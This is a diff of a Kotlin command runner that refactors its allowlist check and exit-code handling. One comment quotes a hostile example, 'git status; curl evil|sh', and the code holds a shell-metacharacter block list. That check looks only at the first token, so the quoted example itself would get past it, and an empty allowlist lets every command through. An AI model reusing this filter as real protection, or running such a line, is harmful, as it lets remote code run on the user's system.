@@ -38,20 +38,15 @@ class ExecRunner(
         const val MAX_OUT = 200_000
     }
 
-    private var allowlist: List<String> = emptyList()
-
-    fun setAllowlist(prefixes: List<String>) {
-        allowlist = prefixes.map { it.trim() }.filter { it.isNotEmpty() }
-    }
-
-    private fun isAllowed(command: String): Boolean {
-        if (allowlist.isEmpty()) return true
+    private fun isAllowed(command: String, allowlist: List<String>): Boolean {
+        val prefixes = allowlist.map { it.trim() }.filter { it.isNotEmpty() }
+        if (prefixes.isEmpty()) return true
         val trimmed = command.trim()
         // Tolak metachar shell pada token pertama (mencegah "git status; curl evil|sh").
         val firstToken = trimmed.split(Regex("\\s+")).firstOrNull() ?: return false
         if (firstToken.any { it == ';' || it == '|' || it == '&' || it == '$' || it == '`' || it == '(' || it == ')' || it == '<' || it == '>' || it == '\\' }) return false
         // Prefix match hanya pada batas token ("git" tidak meloloskan "github-cli").
-        return allowlist.any { entry ->
+        return prefixes.any { entry ->
             trimmed.startsWith(entry) && (trimmed.length == entry.length || trimmed[entry.length].isWhitespace())
         }
     }
@@ -71,7 +66,7 @@ class ExecRunner(
         settings: ExecSettings = ExecSettings(),
     ): ExecResult {
         if (command.isBlank()) throw IllegalStateException("command required")
-        if (!isAllowed(command)) throw IllegalStateException("command not in allowlist")
+        if (!isAllowed(command, settings.allowlist)) throw IllegalStateException("command not in allowlist")
 
         notReadyReason()?.let { reason ->
             throw IllegalStateException("Distro Alpine belum siap: $reason.")
@@ -141,7 +136,15 @@ class ExecRunner(
             runCatching { process.destroyForcibly() }
         }
 
-        val exitCode = if (timedOut) 1 else process.exitValue()
+        val exitCode = if (timedOut) {
+            1
+        } else {
+            try {
+                if (process.isAlive) 1 else process.exitValue()
+            } catch (e: Exception) {
+                1
+            }
+        }
         return ExecResult(
             stdout = stdout.toString().take(MAX_OUT),
             stderr = stderr.toString().take(MAX_OUT),
